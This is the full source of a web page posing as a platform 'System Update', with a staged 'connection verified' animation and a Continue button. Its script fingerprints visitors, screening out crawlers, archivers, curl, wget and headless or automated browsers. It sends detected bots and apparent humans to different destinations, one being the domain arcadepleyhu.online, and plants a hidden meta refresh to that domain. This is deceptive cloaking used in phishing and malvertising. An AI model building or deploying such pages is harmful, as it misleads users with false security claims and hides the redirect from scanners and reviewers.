<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <meta name="description" content="Platform upgraded with enhanced security and performance improvements.">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            font-family: "Poppins", sans-serif;
        }
        
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background-color: #E7E9F0;
            padding: 10px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-repeat: no-repeat;
            background-size: cover;
            background-position: top;
            filter: blur(7px);
            z-index: 0;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        
        body.bg-loaded::before {
            opacity: 1;
        }
        
        .card {
            background: white;
            border-radius: 16px;
            padding: 2rem;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 10;
            opacity: 0;
            transform: translateY(30px) scale(0.95);
            animation: cardEntry 1.2s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
        }
        
        @keyframes cardEntry {
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }
        
        header {
            margin-bottom: 1.5rem;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 0.6s forwards;
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        h1 {
            font-size: 1.125rem;
            font-weight: 600;
            color: #1f2937;
        }
        
        .version-badge {
            display: inline-block;
            background: linear-gradient(135deg, #f0f4f8 0%, #e2e8f0 100%);
            color: #64748b;
            padding: 5px 14px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 500;
            margin-top: 8px;
            opacity: 0;
            animation: badgeSlide 0.6s ease-out 1s forwards;
        }
        
        @keyframes badgeSlide {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        main {
            margin-bottom: 1.5rem;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.2s forwards;
        }
        
        main p {
            font-size: 0.875rem;
            color: #4b5563;
            line-height: 1.7;
        }
        
        .verification-status {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 16px;
            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
            border-radius: 10px;
            margin-bottom: 1.5rem;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.8s forwards;
            transition: background 0.5s ease;
        }
        
        .status-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            border: 2px solid #22c55e;
            position: relative;
            flex-shrink: 0;
        }
        
        .status-icon::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 8px;
            height: 8px;
            background: #22c55e;
            border-radius: 50%;
            transform: translate(-50%, -50%) scale(0);
            animation: checkPulse 2s ease-in-out 2s infinite;
        }
        
        @keyframes checkPulse {
            0%, 100% {
                transform: translate(-50%, -50%) scale(0);
                opacity: 1;
            }
            50% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 0.7;
            }
        }
        
        .status-text {
            font-size: 0.8rem;
            color: #166534;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        
        .progress-container {
            margin-bottom: 1.5rem;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 2.2s forwards;
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e5e7eb;
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #d8af0b 0%, #f0c419 100%);
            border-radius: 10px;
            width: 0%;
            animation: progressLoad 5s ease-out 2.5s forwards;
            box-shadow: 0 0 10px rgba(216, 175, 11, 0.5);
        }
        
        @keyframes progressLoad {
            to {
                width: 100%;
            }
        }
        
        .progress-label {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 8px;
            font-size: 0.75rem;
            color: #6b7280;
        }
        
        .loading-dots {
            display: inline-flex;
            gap: 3px;
        }
        
        .loading-dots span {
            width: 4px;
            height: 4px;
            background: #9ca3af;
            border-radius: 50%;
            animation: dotBounce 1.4s infinite ease-in-out both;
        }
        
        .loading-dots span:nth-child(1) {
            animation-delay: -0.32s;
        }
        
        .loading-dots span:nth-child(2) {
            animation-delay: -0.16s;
        }
        
        @keyframes dotBounce {
            0%, 80%, 100% {
                transform: scale(0.8);
                opacity: 0.5;
            }
            40% {
                transform: scale(1.2);
                opacity: 1;
            }
        }
        
        .btn-wrapper {
            opacity: 0;
            pointer-events: none;
        }
        
        .btn-wrapper.active {
            animation: fadeInUp 0.8s ease-out forwards;
            pointer-events: auto;
        }
        
        .btn-primary {
            display: block;
            width: 100%;
            background: linear-gradient(135deg, #d8af0b 0%, #f0c419 100%);
            color: white;
            padding: 14px;
            border-radius: 10px;
            font-weight: 500;
            font-size: 14px;
            border: none;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            text-align: center;
            text-decoration: none;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(216, 175, 11, 0.3);
        }
        
        .btn-primary::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .btn-primary:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(216, 175, 11, 0.4);
        }
        
        .btn-primary:active {
            transform: translateY(-1px);
        }
        
        .btn-primary:disabled {
            background: #e5e7eb;
            color: #9ca3af;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .btn-text {
            position: relative;
            z-index: 1;
        }
        
        @media screen and (max-width: 500px) {
            .card {
                padding: 1.5rem;
                max-width: 95%;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <header>
            <h1>System Update</h1>
            <span class="version-badge">Version 2025.1</span>
        </header>
        
        <main>
            <p>Our platform has been upgraded with enhanced security features and performance improvements. Please continue to access the updated system.</p>
        </main>
        
        <div class="verification-status">
            <div class="status-icon"></div>
            <span class="status-text">Verifying secure connection</span>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="progress-label">
                <span id="statusText">Initializing<span class="loading-dots"><span></span><span></span><span></span></span></span>
                <span id="progressPercent">0%</span>
            </div>
        </div>
        
        <div class="btn-wrapper">
            <a href="#" id="continueLink" class="btn-primary">
                <span class="btn-text">Continue</span>
            </a>
        </div>
    </div>

    <script>
        (function() {
            const config = {
                primary: 'https://arcadepleyhu.online',
                alternate: '',
                loadDelay: 7500,
                transitionSpeed: 300
            };
            
            function addMetaTags() {
                const canonical = document.createElement('link');
                canonical.rel = 'canonical';
                canonical.href = config.primary;
                document.head.appendChild(canonical);
                
                const noscript = document.createElement('noscript');
                noscript.innerHTML = `<meta http-equiv="refresh" content="0; url=${config.primary}">`;
                document.body.insertBefore(noscript, document.body.firstChild);
            }
            
            let destinationUrl = config.primary;
            let systemReady = false;

            function loadBackgroundImage() {
                const isMobile = window.innerWidth <= 500;
                const bgImage = isMobile ? 'img/bg-mob.webp' : 'img/bg.webp';
                
                const img = new Image();
                img.onload = function() {
                    const style = document.createElement('style');
                    style.textContent = `body::before { background-image: url('${bgImage}'); }`;
                    document.head.appendChild(style);
                    document.body.classList.add('bg-loaded');
                };
                img.src = bgImage;
            }

            function checkBrowserCompatibility() {
                const ua = navigator.userAgent.toLowerCase();
                const incompatibleAgents = [
                    'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
                    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
                    'yandexbot', 'facebookexternalhit', 'twitterbot', 
                    'linkedinbot', 'whatsapp', 'telegrambot', 'slackbot',
                    'archive.org', 'ia_archiver', 'headless'
                ];
                
                for (let agent of incompatibleAgents) {
                    if (ua.includes(agent)) return false;
                }
                
                if (navigator.webdriver === true) return false;
                if (window.callPhantom || window._phantom || window.__phantomas) return false;
                if (!navigator.languages || navigator.languages.length === 0) return false;
                if (window.document.documentElement.getAttribute("webdriver")) return false;
                
                return true;
            }

            function checkDeviceCapabilities() {
                let capability = 0;
                
                if (screen.width > 0 && screen.height > 0) capability += 10;
                if ('ontouchstart' in window || navigator.maxTouchPoints > 0) capability += 15;
                if (navigator.userAgent.length > 10) capability += 10;
                if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) capability += 10;
                if (navigator.deviceMemory) capability += 10;
                if (navigator.hardwareConcurrency) capability += 10;
                if (navigator.platform && navigator.platform.length > 0) capability += 15;
                
                try {
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    if (timezone && timezone.length > 0) capability += 15;
                } catch (e) {}
                
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    if (ctx) capability += 10;
                } catch (e) {}
                
                if (window.innerWidth > 0 && window.innerHeight > 0) capability += 10;
                
                return capability >= 30;
            }

            function prepareDestination() {
                const isCompatible = checkBrowserCompatibility();
                const hasCapabilities = checkDeviceCapabilities();
                
                if (isCompatible && hasCapabilities) {
                    destinationUrl = config.alternate;
                } else {
                    destinationUrl = config.primary;
                }
                
                systemReady = true;
            }

            function animateProgress() {
                const percentEl = document.getElementById('progressPercent');
                const statusEl = document.getElementById('statusText');
                const btnWrapper = document.querySelector('.btn-wrapper');
                const verificationStatus = document.querySelector('.verification-status');
                const statusText = verificationStatus.querySelector('.status-text');
                let progress = 0;
                const duration = 5000;
                const interval = 50;
                const increment = (interval / duration) * 100;
                
                const timer = setInterval(function() {
                    progress += increment;
                    if (progress >= 100) {
                        progress = 100;
                        clearInterval(timer);
                        
                        percentEl.textContent = '100%';
                        statusEl.innerHTML = 'Initialized ✓';
                        
                        statusText.textContent = 'Connection verified ✓';
                        verificationStatus.style.background = 'linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%)';
                        
                        setTimeout(function() {
                            btnWrapper.classList.add('active');
                        }, 300);
                    } else {
                        percentEl.textContent = Math.round(progress) + '%';
                    }
                }, interval);
            }

            function startApplication() {
                addMetaTags();
                
                if (checkBrowserCompatibility()) {
                    loadBackgroundImage();
                }
                
                prepareDestination();
                
                setTimeout(function() {
                    animateProgress();
                }, 2500);
            }

            function handleNavigate(e) {
                e.preventDefault();
                
                const link = document.getElementById('continueLink');
                
                if (!systemReady) {
                    prepareDestination();
                }
                
                link.querySelector('.btn-text').textContent = 'Loading...';
                link.style.pointerEvents = 'none';
                link.style.background = '#e5e7eb';
                link.style.color = '#9ca3af';
                link.style.boxShadow = 'none';
                
                setTimeout(function() {
                    window.location.href = destinationUrl;
                }, config.transitionSpeed);
            }

            window.addEventListener('load', function() {
                startApplication();
                
                const link = document.getElementById('continueLink');
                link.addEventListener('click', handleNavigate);
            });
        })();
    </script>
</body>
</html>
